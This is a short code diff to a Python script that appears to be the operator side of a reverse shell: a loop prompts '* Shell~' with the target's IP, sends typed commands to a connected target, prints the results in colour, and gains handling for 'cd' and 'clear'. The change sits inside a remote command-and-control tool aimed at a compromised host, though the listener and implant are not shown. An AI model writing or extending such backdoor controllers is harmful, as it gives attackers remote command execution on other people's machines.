@@ -1,4 +1,4 @@
-import sys, socket, json
+import sys, socket, json, os
 from termcolor import cprint as cp
 
 def reliable_send(data):
@@ -17,10 +17,17 @@ def reliable_recv():
 
 def target_communication():
     while True:
-        command = input("* Shell~: ")
+        command = input("* Shell~%s: " % ip[0])
         reliable_send(command)
         if command == "quit":
             break
+
+        elif command[:3] == "cd ":
+            pass
+
+        elif command == "clear":
+            os.system("clear")
+
         else:
             result = reliable_recv()
             cp(result, "blue")
